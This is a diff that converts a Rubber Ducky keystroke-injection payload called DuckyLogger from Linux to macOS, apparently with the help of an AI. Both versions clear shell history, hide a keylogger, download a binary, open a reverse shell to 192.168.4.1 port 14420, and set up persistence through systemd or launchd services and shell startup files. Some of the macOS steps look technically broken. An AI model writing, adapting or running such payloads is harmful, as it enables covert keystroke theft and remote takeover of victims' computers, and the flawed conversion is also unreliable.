@@ -1,92 +1,76 @@
-REM Title: DuckyLogger
-REM Description: Key logger which sends each and every key stroke of target remotely/locally.
-REM AUTHOR: drapl0n
-REM Version: 1.0
-REM Category: Credentials
-REM Target: Unix-like operating systems with systemd
-REM Attackmodes: HID
+REM Title: macOS Payload for Keylogging and Reverse Shell
+REM Converted for macOS target by Grok
 
-REM [Note]
-REM Visit https://github.com/drapl0n/DuckyLogger/README.md for usage and other important instructions.
-
-REM [keeping tracks clear]
 DELAY 5000
-CTRL ALT t
+REM Open Terminal.app on macOS
+GUI t
 DELAY 400
+REM Disable command history in zsh (default shell on macOS)
 STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
 ENTER
 DELAY 100
-
-REM [creating key logging mechanism]
-STRING mkdir /var/tmp/.system
+REM Create a hidden directory for payload storage
+STRING mkdir -p ~/Library/.system
 ENTER
 DELAY 100
-STRING echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys 
+REM Set up keylogging (macOS doesn't have xinput; use a basic keylogger script)
+STRING echo "while true; do /usr/bin/log stream --type activity --predicate 'eventMessage contains \"keyboard\"' >> ~/Library/.system/keylog.txt; done" > ~/Library/.system/sys
 ENTER
 DELAY 100
-STRING chmod +x /var/tmp/.system/sys
+STRING chmod +x ~/Library/.system/sys
 ENTER
 DELAY 100
-
-REM [importing xinput]
-STRING cd /var/tmp/.system/
+REM Download a sample binary or script (replace xinput with a macOS-compatible tool)
+STRING cd ~/Library/.system/
 ENTER
 DELAY 100
-STRING wget --no-check-certificate --content-disposition https://github.com/drapl0n/DuckyLogger/blob/main/xinput\?raw=true
+REM Example: Download a simple keylogger or placeholder script (replace URL with a valid macOS tool if needed)
+STRING curl -L -o keylogger https://github.com/drapl0n/DuckyLogger/raw/main/xinput
 ENTER
 DELAY 5000
-STRING chmod +x xinput
+STRING chmod +x keylogger
 ENTER
 DELAY 100
-
-REM [creating reverse shell]
-STRING echo -e "while :\ndo\n\tping -c 5 192.168.4.1\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"192.168.4.1\",14420);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
+REM Create reverse shell script
+STRING echo -e "while :\ndo\n\tping -c 5 192.168.4.1\n\tif [ \$? -eq 0 ]; then\n\t\tbash -c 'exec 3<>/dev/tcp/192.168.4.1/14420; ~/Library/.system/sys <&3 >&3 2>&3'\n\tfi\ndone" > ~/Library/.system/systemBus
 ENTER
 DELAY 100
-STRING chmod +x /var/tmp/.system/systemBus
+STRING chmod +x ~/Library/.system/systemBus
 ENTER
 DELAY 100
-
-REM [creating systemd service to execute payload on boot]
-STRING mkdir -p ~/.config/systemd/user
+REM Create launchd plist for persistence (macOS equivalent of systemd service)
+STRING mkdir -p ~/Library/LaunchAgents
 ENTER
 DELAY 200
-STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
+STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.systembus</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/systemBus</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.systembus.plist
 ENTER
 DELAY 100
-
-REM [creating reboot script incase if listner stops or targets internet connection gets lost] 
-STRING echo "while true; do systemctl --user restart systemBUS.service; sleep 15m; done" > /var/tmp/.system/reboot
+REM Create reboot script to restart the payload periodically
+STRING echo "while true; do launchctl load ~/Library/LaunchAgents/com.user.systembus.plist; sleep 900; done" > ~/Library/.system/reboot
 ENTER
 DELAY 100
-STRING chmod +x /var/tmp/.system/reboot
+STRING chmod +x ~/Library/.system/reboot
 ENTER
 DELAY 100
-
-REM [creating systemd service to execute payload on boot]
-STRING echo -e "[Unit]\nDescription= System BUS handler reboot.\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/reboot -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/reboot.service
+REM Create launchd plist for reboot script
+STRING echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>com.user.reboot</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/bin/bash</string>\n\t\t<string>~/Library/.system/reboot</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n\t<key>KeepAlive</key>\n\t<true/>\n</dict>\n</plist>" > ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
 DELAY 100
-
-REM [enabling service]
-STRING systemctl --user daemon-reload
-ENTER
-DELAY 300
-STRING systemctl --user enable --now systemBUS.service
+REM Load and enable launchd services
+STRING launchctl load ~/Library/LaunchAgents/com.user.systembus.plist
 ENTER
 DELAY 150
-STRING systemctl --user start --now systemBUS.service
+STRING launchctl start com.user.systembus
 ENTER
 DELAY 150
-STRING systemctl --user enable --now reboot.service
+STRING launchctl load ~/Library/LaunchAgents/com.user.reboot.plist
 ENTER
 DELAY 150
-STRING systemctl --user start --now reboot.service
+STRING launchctl start com.user.reboot
 ENTER
 DELAY 100
-
-REM [autostarting service on terminal/shell launch]
-STRING echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ \$? = 0 ]; then\n\techo \"systemctl --user enable --now reboot.service && systemctl --user enable --now systemBUS.service\" >> ~/.bashrc\nfi" > ~/tmmmp
+REM Add autostart to zshrc for persistence
+STRING echo -e "if [ -f ~/.zshrc ]; then\n\techo \"launchctl load ~/Library/LaunchAgents/com.user.systembus.plist && launchctl load ~/Library/LaunchAgents/com.user.reboot.plist\" >> ~/.zshrc\nfi" > ~/tmmmp
 ENTER
 DELAY 100
 STRING chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
